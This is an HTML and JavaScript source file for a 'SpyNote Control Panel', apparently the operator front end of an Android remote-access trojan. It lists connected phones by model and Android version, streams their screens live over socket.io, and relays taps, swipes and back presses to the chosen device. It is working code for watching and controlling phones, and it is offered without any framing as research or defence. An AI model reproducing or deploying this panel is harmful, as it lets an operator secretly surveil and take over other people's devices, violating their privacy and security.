<!DOCTYPE html>
<html>
<head>
    <title>ðŸ“± SpyNote Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,0,0,0.9); padding: 15px; 
            max-height: 80vh; overflow-y: auto; width: 280px; 
            border-radius: 10px; backdrop-filter: blur(10px);
        }
        .device { padding: 12px; margin: 8px 0; background: #333; cursor: pointer; 
            border-radius: 8px; transition: all 0.3s; border-left: 4px solid #555; }
        .device:hover { background: #444; transform: translateX(5px); }
        .active { background: #00ff88 !important; color: #000; border-left-color: #00ff88; }
        .disconnected { opacity: 0.5; border-left-color: #ff4444; }

        #phone-frame {
            width: 400px; height: 850px; margin: 20px auto; 
            background: #000; border: 25px solid #333; border-radius: 50px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        #screen { 
            width: 100%; height: 100%; background: #111; border-radius: 20px;
            image-rendering: pixelated; image-rendering: crisp-edges;
        }
        #fps-counter { position: fixed; top: 10px; right: 150px; 
            font-size: 14px; font-weight: bold; color: #00ff88; }
        #status { position: fixed; top: 10px; right: 10px; 
            background: rgba(0,0,0,0.8); padding: 12px; border-radius: 8px; font-size: 13px; }
        #controls { text-align: center; position: fixed; bottom: 20px; 
            left: 50%; transform: translateX(-50%); }
        button {
            padding: 15px 30px; margin: 0 10px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 25px; cursor: pointer; 
            font-size: 16px; font-weight: bold; transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0,123,255,0.4);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,123,255,0.6); }
        button:active { transform: translateY(0); }
        .loading { color: #ffaa00; }
    </style>
</head>
<body>
    <div id="devices">
        <h3>ðŸ“± Online Devices</h3>
        <div id="device-list">ðŸ”„ Connecting...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus" class="loading">ðŸ”„</span></div>
        <div>FPS: <span id="fps">0</span> | <span id="selectedDevice">-</span></div>
    </div>
    <div id="fps-counter">FPS: 0</div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()">ðŸ”™ Back</button>
        <button onclick="toggleFullScreen()">ðŸ“± Fullscreen</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let lastFrameTime = 0, frameCount = 0;
        let frameQueue = []; // ðŸ”¥ 5 FRAME BUFFER - NO DROPS!
        
        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDeviceSpan = document.getElementById('selectedDevice');
        const fpsCounter = document.getElementById('fps-counter');
        const fpsDisplay = document.getElementById('fps');

        // ðŸ”¥ SOCKET EVENTS
        socket.on('connect', () => {
            connectionStatus.textContent = 'ðŸŸ¢ LIVE';
            connectionStatus.style.color = '#00ff88';
            console.log('ðŸŒ Connected to server');
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        // ðŸ”¥ PERFECT FRAME HANDLING WITH BUFFER
        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            // ðŸ”¥ ADD TO BUFFER (always keep latest 5 frames)
            frameQueue.push(data);
            if (frameQueue.length > 5) frameQueue.shift();
            
            renderLatestFrame();
        });

        // ðŸ”¥ RENDER LATEST FRAME IMMEDIATELY
        function renderLatestFrame() {
            if (frameQueue.length === 0) {
                ctx.fillStyle = '#111';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = '#666';
                ctx.font = '24px Arial';
                ctx.textAlign = 'center';
                ctx.fillText('Waiting for frames...', canvas.width/2, canvas.height/2);
                return;
            }
            
            const latestFrame = frameQueue[frameQueue.length - 1];
            try {
                deviceWidth = latestFrame.width;
                deviceHeight = latestFrame.height;
                
                const img = new Image();
                img.onload = () => {
                    // ðŸ”¥ PERFECT CANVAS RESIZE
                    const rect = phoneFrame.getBoundingClientRect();
                    canvas.width = rect.width;
                    canvas.height = rect.height;
                    
                    // ðŸ”¥ ULTRA CRISP RENDERING
                    ctx.imageSmoothingEnabled = false;
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                    
                    // ðŸ”¥ FPS CALCULATION
                    frameCount++;
                    const now = performance.now();
                    if (now - lastFrameTime >= 1000) {
                        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                        fpsCounter.textContent = `FPS: ${fps}`;
                        fpsDisplay.textContent = fps;
                        frameCount = 0;
                        lastFrameTime = now;
                    }
                };
                
                img.onerror = () => {
                    console.error('âŒ Image decode failed');
                    ctx.fillStyle = '#222';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                };
                
                img.src = 'data:image/jpeg;base64,' + latestFrame.data;
                
            } catch (e) {
                console.error('Render error:', e);
            }
        }

        // ðŸ”¥ CONTINUOUS RENDERING LOOP (33ms = 30FPS)
        setInterval(renderLatestFrame, 33);

        // ðŸ”¥ LOAD DEVICES
        fetch('/devices').then(r => r.json()).then(updateDeviceList).catch(() => {
            deviceList.innerHTML = '<div style="color:#ffaa00">ðŸ”„ Server connecting...</div>';
        });

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''} Android ${info.version || '?'}</small><br>
                        <small style="color: ${info.connected ? '#00ff88' : '#ff4444'}">
                            ${info.connected ? 'ðŸŸ¢ LIVE' : 'ðŸ”´ OFFLINE'}
                        </small>
                        ${info.width ? `<br><small>${info.width}x${info.height}</small>` : ''}
                    </div>
                `).join('') : '<div style="color:#ffaa00">No devices online</div>';
        }

        window.selectDevice = function(deviceId, el) {
            currentDevice = deviceId;
            selectedDeviceSpan.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            frameQueue = []; // ðŸ”¥ Clear buffer for new device
            console.log('ðŸ“± LIVE SELECTED:', deviceId);
            renderLatestFrame();
        }

        // ðŸ”¥ PERFECT TOUCH/MOUSE CONTROLS
        let startX = 0, startY = 0, isDragging = false;

        function getDeviceCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // Mouse events
        phoneFrame.addEventListener('mousedown', e => {
            e.preventDefault();
            isDragging = true;
            const coords = getDeviceCoords(e.clientX, e.clientY);
            startX = coords.x; startY = coords.y;
            sendTap(coords.x, coords.y);
        });

        phoneFrame.addEventListener('mousemove', e => {
            if (!isDragging || !currentDevice) return;
            e.preventDefault();
            const coords = getDeviceCoords(e.clientX, e.clientY);
            sendSwipe(startX, startY, coords.x, coords.y);
        });

        phoneFrame.addEventListener('mouseup', () => isDragging = false);
        phoneFrame.addEventListener('mouseleave', () => isDragging = false);

        // Touch events
        phoneFrame.addEventListener('touchstart', e => {
            e.preventDefault();
            isDragging = true;
            const touch = e.touches[0];
            const coords = getDeviceCoords(touch.clientX, touch.clientY);
            startX = coords.x; startY = coords.y;
            sendTap(coords.x, coords.y);
        }, { passive: false });

        phoneFrame.addEventListener('touchmove', e => {
            if (!isDragging || !currentDevice) return;
            e.preventDefault();
            const touch = e.touches[0];
            const coords = getDeviceCoords(touch.clientX, touch.clientY);
            sendSwipe(startX, startY, coords.x, coords.y);
        }, { passive: false });

        phoneFrame.addEventListener('touchend', () => isDragging = false);
        phoneFrame.addEventListener('touchcancel', () => isDragging = false);

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'tap', 
                x, y 
            });
            console.log('ðŸ‘† Tap:', x, y);
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, 
                endX: ex, endY: ey 
            });
        }

        window.sendBack = function() {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'back' 
            });
            console.log('ðŸ”™ Back pressed');
        }

        window.toggleFullScreen = function() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen?.();
            } else {
                document.exitFullscreen?.();
            }
        }

        // ðŸ”¥ RESPONSIVE RESIZE
        window.addEventListener('resize', renderLatestFrame);
    </script>
</body>
</html>
